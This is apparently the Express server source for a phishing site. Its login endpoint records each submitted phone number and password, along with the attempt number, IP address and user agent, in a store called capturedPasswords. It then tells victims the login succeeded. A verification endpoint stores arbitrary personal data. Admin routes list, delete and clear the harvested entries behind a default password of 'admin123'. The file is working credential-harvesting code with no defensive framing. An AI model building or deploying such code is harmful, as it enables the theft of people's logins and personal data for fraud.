// server.js
const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 10000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// --- In-Memory Storage (Replaces MongoDB) ---
const capturedPasswords = [];
const userVerifications = [];
let nextPasswordId = 1;
let nextVerificationId = 1;

// --- API Routes ---
app.post('/api/login', (req, res) => {
    try {
        const { phone, password, attemptNumber } = req.body;
        const newPassword = {
            _id: nextPasswordId++,
            userId: phone,
            password,
            attemptNumber,
            userAgent: req.headers['user-agent'],
            ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
            timestamp: new Date()
        };
        capturedPasswords.push(newPassword);

        res.json({ success: true, message: 'Login successful', user: { id: phone, phone } });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, error: 'Login failed' });
    }
});

app.post('/api/verification', (req, res) => {
    try {
        const newVerification = {
            _id: nextVerificationId++,
            ...req.body,
            createdAt: new Date()
        };
        userVerifications.push(newVerification);
        res.json({ success: true, message: 'Verification submitted successfully!' });
    } catch (error) {
        console.error('Verification error:', error);
        res.status(500).json({ success: false, error: 'Failed to save verification data' });
    }
});

// --- Admin Routes ---
app.post('/admin/login', (req, res) => {
    const { password } = req.body;
    // Default master password to 'admin123' if not set
    const masterPassword = process.env.ADMIN_MASTER_PASSWORD || 'admin123';
    if (password && password === masterPassword) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid master password' });
    }
});

app.get('/admin/captured-passwords', (req, res) => {
    try {
        // Sort descending by timestamp
        const sorted = [...capturedPasswords].sort((a, b) => b.timestamp - a.timestamp);
        res.json(sorted);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

app.get('/admin/verifications', (req, res) => {
    try {
        const sorted = [...userVerifications].sort((a, b) => b.createdAt - a.createdAt);
        res.json(sorted);
    } catch(error) {
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

// --- Delete Routes ---
app.delete('/admin/delete-password/:id', (req, res) => {
    try {
        const id = parseInt(req.params.id);
        const index = capturedPasswords.findIndex(p => p._id === id);
        if (index > -1) {
            capturedPasswords.splice(index, 1);
        }
        res.json({ success: true, message: 'Password entry deleted' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to delete entry' });
    }
});

app.delete('/admin/delete-verification/:id', (req, res) => {
    try {
        const id = parseInt(req.params.id);
        const index = userVerifications.findIndex(v => v._id === id);
        if (index > -1) {
            userVerifications.splice(index, 1);
        }
        res.json({ success: true, message: 'Verification entry deleted' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to delete entry' });
    }
});

app.delete('/admin/clear-passwords', (req, res) => {
    try {
        capturedPasswords.length = 0;
        res.json({ success: true, message: 'All password entries cleared' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to clear data' });
    }
});

app.delete('/admin/clear-verifications', (req, res) => {
    try {
        userVerifications.length = 0;
        res.json({ success: true, message: 'All verification entries cleared' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to clear data' });
    }
});


// --- Serve Frontend Files ---
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});